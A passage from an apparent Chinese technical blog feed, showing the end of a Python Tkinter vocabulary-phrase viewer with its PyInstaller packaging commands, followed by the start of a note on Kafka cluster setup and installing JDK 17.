tk.TclError:<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>                phrase = <span class="hljs-variable language_">self</span>.displayed_words[<span class="hljs-variable language_">self</span>.current_index]<br>                pyperclip.copy(phrase)<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;复制短语: <span class="hljs-subst">&#123;phrase&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">record_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Append the current phrase to the record file if not already present.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>            phrase = <span class="hljs-variable language_">self</span>.displayed_words[<span class="hljs-variable language_">self</span>.current_index]<br>            output_file = <span class="hljs-variable language_">self</span>.record_file<br>            <span class="hljs-keyword">try</span>:<br>                os.makedirs(os.path.dirname(output_file), exist_ok=<span class="hljs-literal">True</span>)<br>                <br>                phrase_exists = <span class="hljs-literal">False</span><br>                existing_phrases = []<br>                <span class="hljs-keyword">if</span> os.path.exists(output_file):<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                        content = f.read()<br>                        existing_phrases = [<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip().lower() <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&#x27;^\s*\d+\.\s*(.*?)\s*$&#x27;</span>, content, re.MULTILINE)]<br>                        <span class="hljs-keyword">if</span> phrase.lower() <span class="hljs-keyword">in</span> existing_phrases:<br>                            phrase_exists = <span class="hljs-literal">True</span><br>                <br>                <span class="hljs-keyword">if</span> phrase_exists:<br>                    msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">f&quot;短语 &#x27;<span class="hljs-subst">&#123;phrase&#125;</span>&#x27; 已存在！&quot;</span>, <br>                                 font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;red&quot;</span>, <br>                                 bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>                    msg.pack(pady=<span class="hljs-number">5</span>)<br>                    <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">2000</span>, msg.destroy)<br>                    <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;短语已存在: <span class="hljs-subst">&#123;phrase&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                        f.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(existing_phrases) + <span class="hljs-number">1</span>&#125;</span>. <span class="hljs-subst">&#123;phrase&#125;</span>\n&quot;</span>)<br>                    <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;记录短语: <span class="hljs-subst">&#123;phrase&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;记录短语失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;记录短语失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Delete the current phrase from the current Markdown file and update the display.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                messagebox.showwarning(<span class="hljs-string">&quot;警告&quot;</span>, <span class="hljs-string">&quot;请先加载文件&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            phrase = <span class="hljs-variable language_">self</span>.displayed_words[<span class="hljs-variable language_">self</span>.current_index]<br>            output_file = <span class="hljs-variable language_">self</span>.current_file<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> os.path.exists(output_file):<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                        lines = f.readlines()<br>                    <br>                    new_lines = []<br>                    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">rf&#x27;^\s*\d+\.\s*<span class="hljs-subst">&#123;re.escape(phrase)&#125;</span>\s*$&#x27;</span>, line.strip()):<br>                            new_lines.append(line)<br>                    <br>                    i = <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">for</span> idx, line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(new_lines):<br>                        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\s*\d+\.\s*.*?&#x27;</span>, line.strip()):<br>                            new_lines[idx] = re.sub(<span class="hljs-string">r&#x27;^\s*\d+\.&#x27;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.&quot;</span>, line)<br>                            i += <span class="hljs-number">1</span><br>                    <br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                        f.writelines(new_lines)<br>                    <br>                    <span class="hljs-keyword">if</span> phrase <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.words:<br>                        <span class="hljs-variable language_">self</span>.words.remove(phrase)<br>                    <span class="hljs-keyword">if</span> phrase <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.displayed_words:<br>                        <span class="hljs-variable language_">self</span>.displayed_words.remove(phrase)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_index &gt;= <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>                            <span class="hljs-variable language_">self</span>.current_index = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words) - <span class="hljs-number">1</span>)<br>                    <br>                    msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">f&quot;短语 &#x27;<span class="hljs-subst">&#123;phrase&#125;</span>&#x27; 已删除！&quot;</span>, <br>                                 font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;green&quot;</span>, <br>                                 bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>                    msg.pack(pady=<span class="hljs-number">5</span>)<br>                    <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">2000</span>, msg.destroy)<br>                    <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;删除短语: <span class="hljs-subst">&#123;phrase&#125;</span>&quot;</span>)<br>                    <br>                    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.range_applied <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.start <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.end:<br>                        <span class="hljs-variable language_">self</span>.displayed_words = [w <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.words[<span class="hljs-variable language_">self</span>.start-<span class="hljs-number">1</span>:<span class="hljs-variable language_">self</span>.end] <span class="hljs-keyword">if</span> w <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.words]<br>                        random.shuffle(<span class="hljs-variable language_">self</span>.displayed_words)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_index &gt;= <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>                            <span class="hljs-variable language_">self</span>.current_index = <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words) - <span class="hljs-number">1</span>)<br>                    <span class="hljs-variable language_">self</span>.update_display()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;删除短语失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;删除短语失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">deduplicate_words</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Remove duplicate phrases from the current file, keeping first occurrence, and renumber.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            messagebox.showwarning(<span class="hljs-string">&quot;警告&quot;</span>, <span class="hljs-string">&quot;请先加载文件&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.current_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                lines = f.readlines()<br>            seen_phrases = <span class="hljs-built_in">set</span>()<br>            new_lines = []<br>            counter = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>                <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\s*\d+\.\s*(.*?)\s*$&#x27;</span>, line)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                    phrase = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip().lower()<br>                    <span class="hljs-keyword">if</span> phrase <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen_phrases:<br>                        seen_phrases.add(phrase)<br>                        new_line = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;counter&#125;</span>. <span class="hljs-subst">&#123;<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)&#125;</span>\n&quot;</span><br>                        new_lines.append(new_line)<br>                        counter += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    new_lines.append(line)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.current_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.writelines(new_lines)<br>            <span class="hljs-variable language_">self</span>.load_markdown_file(<span class="hljs-variable language_">self</span>.current_file)<br>            messagebox.showinfo(<span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-string">&quot;查重完成，已移除重复短语并更新文件&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;查重失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;查重失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_phrases_from_file</span>(<span class="hljs-params">self, file_path</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Extract phrases from a file in the format &#x27;number. phrase&#x27;.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                content = f.read()<br>                <span class="hljs-keyword">return</span> [<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">r&#x27;^\s*\d+\.\s*(.*?)\s*$&#x27;</span>, content, re.MULTILINE)]<br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            <span class="hljs-keyword">return</span> []<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;读取文件 <span class="hljs-subst">&#123;file_path&#125;</span> 失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Add a new phrase to the current file and insert it into the unshown shuffled portion.&quot;&quot;&quot;</span><br>        new_phrase = <span class="hljs-variable language_">self</span>.word_entry.get().strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> new_phrase:<br>            msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">&quot;请输入一个单词或短语&quot;</span>, <br>                         font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;orange&quot;</span>, <br>                         bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>            msg.pack(pady=<span class="hljs-number">5</span>)<br>            <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">2000</span>, msg.destroy)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">&quot;请先加载文件&quot;</span>, <br>                         font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;orange&quot;</span>, <br>                         bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>            msg.pack(pady=<span class="hljs-number">5</span>)<br>            <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">2000</span>, msg.destroy)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>        output_file = <span class="hljs-variable language_">self</span>.current_file<br>        <span class="hljs-keyword">try</span>:<br>            os.makedirs(os.path.dirname(output_file), exist_ok=<span class="hljs-literal">True</span>)<br>            existing_phrases = <span class="hljs-variable language_">self</span>.get_phrases_from_file(output_file)<br>            <span class="hljs-keyword">if</span> new_phrase.lower() <span class="hljs-keyword">in</span> [phrase.lower() <span class="hljs-keyword">for</span> phrase <span class="hljs-keyword">in</span> existing_phrases]:<br>                msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">f&quot;短语 &#x27;<span class="hljs-subst">&#123;new_phrase&#125;</span>&#x27; 已存在于当前文件！&quot;</span>, <br>                             font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;red&quot;</span>, <br>                             bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>                msg.pack(pady=<span class="hljs-number">5</span>)<br>                <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">2000</span>, msg.destroy)<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;短语已存在于当前文件: <span class="hljs-subst">&#123;new_phrase&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(existing_phrases) + <span class="hljs-number">1</span>&#125;</span>. <span class="hljs-subst">&#123;new_phrase&#125;</span>\n&quot;</span>)<br>                <span class="hljs-variable language_">self</span>.words.append(new_phrase)<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_index + <span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>                    <span class="hljs-comment"># Insert new word into unshown part and shuffle only that part</span><br>                    <span class="hljs-variable language_">self</span>.displayed_words.append(new_phrase)<br>                    unshown = <span class="hljs-variable language_">self</span>.displayed_words[<span class="hljs-variable language_">self</span>.current_index + <span class="hljs-number">1</span>:]<br>                    random.shuffle(unshown)<br>                    <span class="hljs-variable language_">self</span>.displayed_words = <span class="hljs-variable language_">self</span>.displayed_words[:<span class="hljs-variable language_">self</span>.current_index + <span class="hljs-number">1</span>] + unshown<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># If at the end, just append the new word</span><br>                    <span class="hljs-variable language_">self</span>.displayed_words.append(new_phrase)<br>                <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;添加新短语到当前文件: <span class="hljs-subst">&#123;new_phrase&#125;</span>&quot;</span>)<br>                msg = tk.Label(<span class="hljs-variable language_">self</span>.root, text=<span class="hljs-string">f&quot;短语 &#x27;<span class="hljs-subst">&#123;new_phrase&#125;</span>&#x27; 已添加到当前文件&quot;</span>, <br>                             font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), fg=<span class="hljs-string">&quot;green&quot;</span>, <br>                             bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>                msg.pack(pady=<span class="hljs-number">5</span>)<br>                <span class="hljs-variable language_">self</span>.root.after(<span class="hljs-number">2000</span>, msg.destroy)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;添加短语失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            messagebox.showerror(<span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-string">f&quot;添加短语失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.word_entry.delete(<span class="hljs-number">0</span>, tk.END)<br>        <span class="hljs-variable language_">self</span>.update_display()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_display</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Update the phrase display and progress label with centered text.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.displayed_words <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>            phrase = <span class="hljs-variable language_">self</span>.displayed_words[<span class="hljs-variable language_">self</span>.current_index]<br>            <span class="hljs-variable language_">self</span>.word_text.config(state=<span class="hljs-string">&quot;normal&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.word_text.delete(<span class="hljs-string">&quot;1.0&quot;</span>, tk.END)<br>            <span class="hljs-variable language_">self</span>.word_text.tag_configure(<span class="hljs-string">&quot;center&quot;</span>, justify=<span class="hljs-string">&quot;center&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.word_text.insert(<span class="hljs-string">&quot;1.0&quot;</span>, phrase, <span class="hljs-string">&quot;center&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.word_text.config(state=<span class="hljs-string">&quot;disabled&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.progress_label.config(text=<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.current_index + <span class="hljs-number">1</span>&#125;</span>/<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.displayed_words)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.word_text.config(state=<span class="hljs-string">&quot;normal&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.word_text.delete(<span class="hljs-string">&quot;1.0&quot;</span>, tk.END)<br>            <span class="hljs-variable language_">self</span>.word_text.config(state=<span class="hljs-string">&quot;disabled&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.progress_label.config(text=<span class="hljs-string">&quot;0/0&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_current_word</span>(<span class="hljs-params">self, event=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Select all text in the word_text widget and copy to clipboard using pyperclip.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= <span class="hljs-variable language_">self</span>.current_index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.displayed_words):<br>            <span class="hljs-variable language_">self</span>.word_text.tag_add(<span class="hljs-string">&quot;sel&quot;</span>, <span class="hljs-string">&quot;1.0&quot;</span>, <span class="hljs-string">&quot;end&quot;</span>)<br>            phrase = <span class="hljs-variable language_">self</span>.displayed_words[<span class="hljs-variable language_">self</span>.current_index]<br>            pyperclip.copy(phrase)<br>            <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;选中并复制短语: <span class="hljs-subst">&#123;phrase&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;break&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_words</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Filter and display phrases that are in the current file but not in the record file, in random order.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.record_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            messagebox.showwarning(<span class="hljs-string">&quot;警告&quot;</span>, <span class="hljs-string">&quot;请先加载当前文件和记录文件&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <br>        current_phrases = <span class="hljs-variable language_">self</span>.get_phrases_from_file(<span class="hljs-variable language_">self</span>.current_file)<br>        record_phrases = <span class="hljs-variable language_">self</span>.get_phrases_from_file(<span class="hljs-variable language_">self</span>.record_file)<br>        <br>        filtered_phrases = [phrase <span class="hljs-keyword">for</span> phrase <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.words <span class="hljs-keyword">if</span> phrase.lower() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [rp.lower() <span class="hljs-keyword">for</span> rp <span class="hljs-keyword">in</span> record_phrases]]<br>        random.shuffle(filtered_phrases)<br>        <br>        <span class="hljs-variable language_">self</span>.displayed_words = filtered_phrases<br>        <span class="hljs-variable language_">self</span>.current_index = <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> filtered_phrases <span class="hljs-keyword">else</span> -<span class="hljs-number">1</span><br>        <span class="hljs-variable language_">self</span>.range_applied = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># Stop auto-play when filtering words</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_on:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.auto_play_id <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-variable language_">self</span>.root.after_cancel(<span class="hljs-variable language_">self</span>.auto_play_id)<br>                <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-literal">None</span><br>            <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">False</span><br>            <span class="hljs-variable language_">self</span>.auto_play_status.config(text=<span class="hljs-string">&quot;自动播放: 关闭&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.update_display()<br>        <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">f&quot;过滤后展示 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(filtered_phrases)&#125;</span> 个短语&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    root = tk.Tk()<br>    app = WordViewer(root)<br>    root.mainloop()<br></code></pre></td></tr></table></figure><hr><h2 id="2-打包为-exe"><a href="#2-打包为-exe" class="headerlink" title="2. 打包为 exe"></a>2. 打包为 exe</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 安装打包工具</span><br>pip install pyinstaller<br><br><br><span class="hljs-comment"># 2. 打包代码</span><br>pyinstaller <span class="hljs-operator">-</span>-onefile <span class="hljs-operator">-</span>-windowed <span class="hljs-operator">-</span>-icon<span class="hljs-operator">=</span><span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\I</span>CO<span class="hljs-char escape_">\核</span>心图片小工具.ico&quot;</span> <span class="hljs-operator">-</span>-distpath <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合&quot;</span> <span class="hljs-string">&quot;D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\核</span>心单词小工具.py&quot;</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. --onefile</span><br><span class="hljs-string">1. 打包为单个 .exe 文件。</span><br><span class="hljs-string">2. --windowed</span><br><span class="hljs-string">1. 确保 GUI 程序无控制台窗口</span><br><span class="hljs-string">3. --distpath D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\ </span>D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\核</span>心单词小工具.py</span><br><span class="hljs-string">1. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\ </span>是输出位置</span><br><span class="hljs-string">2. D:<span class="hljs-char escape_">\文</span>件集合<span class="hljs-char escape_">\核</span>心单词小工具.py 是输入位置</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>自研小工具</category>
      
      <category>核心单词小工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Kafka 基础</title>
    <link href="/2025/05/14/%E7%AC%94%E8%AE%B0%EF%BC%9AKafka%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/05/14/%E7%AC%94%E8%AE%B0%EF%BC%9AKafka%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="分布式集群部署"><a href="#分布式集群部署" class="headerlink" title="分布式集群部署"></a>分布式集群部署</h3><p>开放 9092、9093 端口</p><p>4GB 内存和 64GB SSD 磁盘空间</p><h3 id="安装-JDK-17"><a href="#安装-JDK-17" class="headerlink" title="安装  JDK 17"></a>安装  JDK 17</h3><p>Kafka 4.0.0 要求 Java 17（或更高版本）</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 1. 检查当前 JDK 版本</span><br>java -<span class="hljs-built_in">version</span><br><br><br><span class="hljs-comment"># 2. 安装 JDK 177</span><br>sudo apt-<span class="hljs-keyword">get</span> install openjdk<span class="hljs-number">-17</span>-jdk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>消息队列</category>
      
      <category>Kafka</category>
